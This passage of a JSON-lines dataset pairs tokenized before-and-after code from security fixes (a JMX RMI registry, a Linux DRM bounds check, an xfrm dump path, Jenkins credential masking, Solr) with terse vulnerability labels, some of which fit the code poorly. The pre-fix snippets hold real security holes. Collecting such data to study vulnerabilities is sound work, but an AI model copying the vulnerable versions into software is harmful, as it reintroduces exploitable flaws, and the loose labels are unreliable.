"only", "start", "the", "registry", "after", "the", "stub", "was", "created", "rmiServerReference", ".", "set", "(", "rmiServer", ".", "toStub", "(", "))", ";", "rmiServerReference", ".", "set", "(", "null", ")", ";", "/", "**", "*", "A", "registry", "that", "only", "exposes", "a", "single", "remote", "object", ".", "*", "/", "@", "SuppressWarnings", "(", "\"", "restriction", "\"", ")", "private", "static", "class", "JmxRegistry", "extends", "sun", ".", "rmi", ".", "registry", ".", "RegistryImpl", "{", "private", "final", "String", "lookupName", ";", "private", "final", "AtomicReference", "<", "Remote", ">", "remoteServerStub", ";", "JmxRegistry", "(", "final", "int", "port", ",", "final", "String", "lookupName", ",", "final", "AtomicReference", "<", "Remote", ">", "remoteServerStub", ")", "throws", "RemoteException", "{", "super", "(", "port", ")", ";", "this", ".", "lookupName", "=", "lookupName", ";", "this", ".", "remoteServerStub", "=", "remoteServerStub", ";", "}", "@", "Override", "public", "Remote", "lookup", "(", "String", "s", ")", "throws", "NotBoundException", "{", "if", "(", "lookupName", ".", "equals", "(", "s", ")", ")", "{", "final", "Remote", "remote", "=", "remoteServerStub", ".", "get", "(", ");", "if", "(", "remote", "!", "=", "null", ")", "{", "return", "remote", ";", "}", "}", "throw", "new", "NotBoundException", "(", "\"", "Not", "bound", ".", "\")", ";", "}", "@", "Override", "public", "void", "bind", "(", "String", "s", ",", "Remote", "remote", ")", "{", "/", "/", "this", "is", "called", "from", "RMIConnectorServer", "#", "start", ";", "don", "'", "t", "throw", "a", "general", "AccessException", "}", "@", "Override", "public", "void", "unbind", "(", "String", "s", ")", "{", "/", "/", "this", "is", "called", "from", "RMIConnectorServer", "#", "stop", ";", "don", "'", "t", "throw", "a", "general", "AccessException", "}", "@", "Override", "public", "void", "rebind", "(", "String", "s", ",", "Remote", "remote", ")", "{", "/", "/", "might", "as", "well", "not", "throw", "an", "exception", "here", "given", "that", "the", "others", "don", "'", "t", "}", "@", "Override", "public", "String", "[", "]", "list", "(", ")", "{", "return", "new", "String", "[", "]{", "lookupName", "}", ";", "}", "}</s>import", "javax", ".", "management", ".", "remote", ".", "JMXConnectorServerFactory", ";", "import", "java", ".", "rmi", ".", "registry", ".", "LocateRegistry", ";", "*", "<", "p", ">", "Heavily", "based", "on", "j256", "simplejmx", "project", "startRmiRegistry", "(", "port", ")", ";", "startJmxService", "(", "port", ")", ";", "/", "**", "*", "Starts", "an", "RMI", "Registry", "that", "allows", "clients", "to", "lookup", "the", "JMX", "IP", "/", "port", ".", "*", "*", "@", "param", "port", "rmi", "port", "to", "use", "*", "@", "throws", "IOException", "*", "/", "private", "void", "startRmiRegistry", "(", "int", "port", ")", "throws", "IOException", "{", "rmiRegistry", "=", "LocateRegistry", ".", "createRegistry", "(", "port", ")", ";", "}", "/", "**", "*", "Starts", "a", "JMX", "connector", "that", "allows", "(", "un", ")", "registering", "MBeans", "with", "the", "MBean", "server", "and", "RMI", "invocations", ".", "*", "*", "@", "param", "port", "jmx", "port", "to", "use", "*", "@", "throws", "IOException", "*", "/", "private", "void", "startJmxService", "(", "int", "port", ")", "throws", "IOException", "{", "connector", "=", "JMXConnectorServerFactory", ".", "newJMXConnectorServer", "(", "url", ",", "null", ",", "ManagementFactory", ".", "getPlatformMBeanServer", "(", "))", ";"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "num_sizes", ">", "DRM_VMW_MAX_SURFACE_FACES", "*", "DRM_VMW_MAX_MIP_LEVELS", "|", "|", "num_sizes", "=", "=", "0", ")</s>if", "(", "num_sizes", ">", "DRM_VMW_MAX_SURFACE_FACES", "*", "DRM_VMW_MAX_MIP_LEVELS", ")"], "docstring_tokens": ["run", "a", "binary"]}
{"contents": ["empty"], "code_tokens": ["int", "err", ";", "err", "=", "dump_one_state", "(", "x", ",", "0", ",", "&", "info", ")", ";", "if", "(", "err", ")", "{", "return", "ERR_PTR", "(", "err", ")", ";</s>if", "(", "dump_one_state", "(", "x", ",", "0", ",", "&", "info", ")", ")", "{", "return", "NULL", ";"], "docstring_tokens": ["getsockname"]}
{"contents": ["empty"], "code_tokens": ["1", ".", "7", ".", "1", "-", "--", "--", "*", "Do", "not", "print", "credentials", "in", "build", "output", "or", "logs", ".", "Only", "affects", "certain", "pipeline", "steps", "like", "`", "withDockerRegistry", "`", ".", "`", "sh", "`", "step", "is", "not", "affected", "[", "SECURITY", "-", "883", "]", "(", "https", ":", "//", "issues", ".", "jenkins", "-", "ci", ".", "org", "/", "browse", "/", "SECURITY", "-", "883", ")", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", ".", "plugins", "<", "/", "groupId", ">", "<", "artifactId", ">", "docker", "-", "workflow", "<", "/", "artifactId", ">", "<", "version", ">", "1", ".", "15", "<", "/", "version", ">", "<", "scope", ">", "test", "<", "/", "scope", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "org", ".", "jenkins", "-", "ci", ".", "plugins", "<", "/", "groupId", ">", "<", "artifactId", ">", "credentials", "-", "binding", "<", "/", "artifactId", ">", "<", "version", ">", "1", ".", "12", "<", "/", "version", ">", "<", "/", "dependency", ">", "import", "org", ".", "apache", ".", "commons", ".", "io", ".", "output", ".", "NullOutputStream", ";", "import", "org", ".", "jenkinsci", ".", "plugins", ".", "workflow", ".", "steps", ".", "EnvironmentExpander", ";", "return", "doLaunch", "(", "starter", ".", "quiet", "(", "),", "envVars", ",", "starter", ".", "stdout", "(", "),", "starter", ".", "pwd", "(", "),", "starter", ".", "masks", "(", "),", "getCommands", "(", "starter", ")", ");", "private", "Proc", "doLaunch", "(", "boolean", "quiet", ",", "String", "[", "]", "cmdEnvs", ",", "OutputStream", "outputForCaller", ",", "FilePath", "pwd", ",", "boolean", "[", "]", "masks", ",", "String", ".", "..", "commands", ")", "throws", "IOException", "{", "doExec", "(", "watch", ",", "printStream", ",", "masks", ",", "commands", ")", ";", "true", ",", "null", ",", "null", ",", "null", ",", "null", ",", "private", "static", "void", "doExec", "(", "ExecWatch", "watch", ",", "PrintStream", "out", ",", "boolean", "[", "]", "masks", ",", "String", ".", "..", "statements", ")", "{", "for", "(", "int", "i", "=", "0", ";", "i", "<", "statements", ".", "length", ";", "i", "+", "+)", "{", "String", "s", "=", "String", ".", "format", "(", "\"\\", "\"%", "s", "\\", "\"", "\"", ",", "statements", "[", "i", "]", ");", "if", "(", "masks", "!", "=", "null", "&", "&", "masks", "[", "i", "]", ")", "{", "sb", ".", "append", "(", "\"*", "**", "**", "**", "*", "\"", ");", "out", ".", "print", "(", "\"*", "**", "**", "**", "*", "\"", ");", "}", "else", "{", "sb", ".", "append", "(", "s", ")", ";", "out", ".", "print", "(", "s", ")", ";", "}", "watch", ".", "getInput", "(", ").", "write", "(", "ExitCodeOutputStream", ".", "EXIT_COMMAND", ".", "getBytes", "(", "StandardCharsets", ".", "UTF_8", ")", ");", "import", "java", ".", "util", ".", "logging", ".", "Level", ";", "import", "java", ".", "util", ".", "logging", ".", "Logger", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "LoggerRule", ";", "import", "com", ".", "cloudbees", ".", "plugins", ".", "credentials", ".", "common", ".", "StandardUsernamePasswordCredentials", ";", "import", "com", ".", "cloudbees", ".", "plugins", ".", "credentials", ".", "impl", ".", "UsernamePasswordCredentialsImpl", ";", "private", "static", "final", "String", "DOCKER_LOGIN_CMD", "=", "\"", "Executing", "command", ":", "\\", "\"", "docker", "\\", "\"", "\\", "\"", "login", "\\", "\"\"", ";", "@", "Rule", "public", "LoggerRule", "containerExecLogs", "=", "new", "LoggerRule", "(", ")", ".", "record", "(", "Logger", ".", "getLogger", "(", "ContainerExecDecorator", ".", "class", ".", "getName", "(", "))", ",", "Level", ".", "ALL", ")", ";", "@", "Test", "public", "void", "docker", "(", ")", "throws", "Exception", "{", "StandardUsernamePasswordCredentials", "credentials", "=", "new", "UsernamePasswordCredentialsImpl", "(", "CredentialsScope", ".", "GLOBAL", ",", "\"", "ContainerExecDecoratorPipelineTest", "-", "docker", "\"", ",", "\"", "bob", "\"", ",", "\"", "username", "\"", ",", "\"", "secret_password", "\"", ");", "SystemCredentialsProvider", ".", "getInstance", "(", ").", "getCredentials", "(", ").", "add", "(", "credentials", ")", ";", "WorkflowJob", "p", "=", "r", ".", "jenkins", ".", "createProject", "(", "WorkflowJob", ".", "class", ",", "\"", "docker", "\"", ");", "p", ".", "setDefinition", "(", "new", "CpsFlowDefinition", "(", "loadPipelineScript", "(", "\"", "docker", ".", "groovy", "\"", "),", "true", ")", ");", "containerExecLogs", ".", "capture", "(", "1000", ")", ";", "WorkflowRun", "b", "=", "p", ".", "scheduleBuild2", "(", "0", ")", ".", "waitForStart", "(", ");", "assertNotNull", "(", "b", ")", ";", "r", ".", "waitForCompletion", "(", "b", ")", ";", "r", ".", "assertLogContains", "(", "DOCKER_LOGIN_CMD", ",", "b", ")", ";", "/", "/", "check", "that", "we", "don", "'", "t", "accidentally", "start", "exporting", "sensitive", "info", "to", "the", "build", "log", "r", ".", "assertLogNotContains", "(", "\"", "secret_password", "\"", ",", "b", ")", ";", "/", "/", "check", "that", "we", "don", "'", "t", "accidentally", "start", "exporting", "sensitive", "info", "to", "the", "Jenkins", "log", "assertTrue", "(", "\"", "docker", "login", "was", "not", "executed", "\"", ",", "containerExecLogs", ".", "getMessages", "(", ").", "stream", "(", ").", "anyMatch", "(", "msg", "-", ">", "msg", ".", "contains", "(", "DOCKER_LOGIN_CMD", ")", "))", ";", "assertFalse", "(", "\"", "credential", "leaked", "to", "log", "\"", ",", "containerExecLogs", ".", "getMessages", "(", ").", "stream", "(", ").", "anyMatch", "(", "msg", "-", ">", "msg", ".", "contains", "(", "\"", "secret_password", "\"", "))", ");", "}", "pipeline", "{", "agent", "{", "kubernetes", "{", "label", "'", "docker", "'", "containerTemplate", "{", "name", "'", "docker", "'", "image", "'", "docker", ":", "1", ".", "11", "'", "ttyEnabled", "true", "command", "'", "cat", "'", "}", "}", "}", "stages", "{", "stage", "(", "'", "Run", "maven", "'", ")", "{", "steps", "{", "container", "(", "'", "docker", "'", ")", "{", "withDockerRegistry", "(", "registry", ":", "[", "credentialsId", ":", "'", "ContainerExecDecoratorPipelineTest", "-", "docker", "'", "])", "{", "sh", "'", "hostname", "'", "}", "}", "}", "}", "}", "}</s>import", "org", ".", "apache", ".", "commons", ".", "io", ".", "output", ".", "NullOutputStream", ";", "import", "org", ".", "jenkinsci", ".", "plugins", ".", "workflow", ".", "steps", ".", "EnvironmentExpander", ";", "return", "doLaunch", "(", "starter", ".", "quiet", "(", "),", "envVars", ",", "starter", ".", "stdout", "(", "),", "starter", ".", "pwd", "(", "),", "getCommands", "(", "starter", ")", ");", "private", "Proc", "doLaunch", "(", "boolean", "quiet", ",", "String", "[", "]", "cmdEnvs", ",", "OutputStream", "outputForCaller", ",", "FilePath", "pwd", ",", "String", ".", "..", "commands", ")", "throws", "IOException", "{", "doExec", "(", "watch", ",", "printStream", ",", "commands", ")", ";", "true", ",", "null", ",", "null", ",", "null", ",", "private", "static", "void", "doExec", "(", "ExecWatch", "watch", ",", "PrintStream", "out", ",", "String", ".", "..", "statements", ")", "{", "for", "(", "String", "stmt", ":", "statements", ")", "{", "String", "s", "=", "String", ".", "format", "(", "\"\\", "\"%", "s", "\\", "\"", "\"", ",", "stmt", ")", ";", "sb", ".", "append", "(", "s", ")", ";", "out", ".", "print", "(", "s", ")", ";", "watch", ".", "getInput", "(", ").", "write", "(", "ExitCodeOutputStream", ".", "EXIT_COMMAND", ".", "getBytes", "(", "StandardCharsets", ".", "UTF_8", ")", ");"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["SolrRequestInfo", ".", "setRequestInfo", "(", "new", "SolrRequestInfo", "(", "solrReq", ",", "new", "SolrQueryResponse", "(", "))", ");", "@", "AwaitsFix", "(", "bugUrl", "=", "\"", "https", ":", "//", "issues", ".", "apache", ".", "org", "/", "jira", "/", "browse", "/", "SOLR", "-", "13098", "\"", ")</s>"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["same", "-", ">", "dest_count", "=", "count", ";</s>"], "docstring_tokens": ["by", "changing", "a", "certain", "count", "value"]}
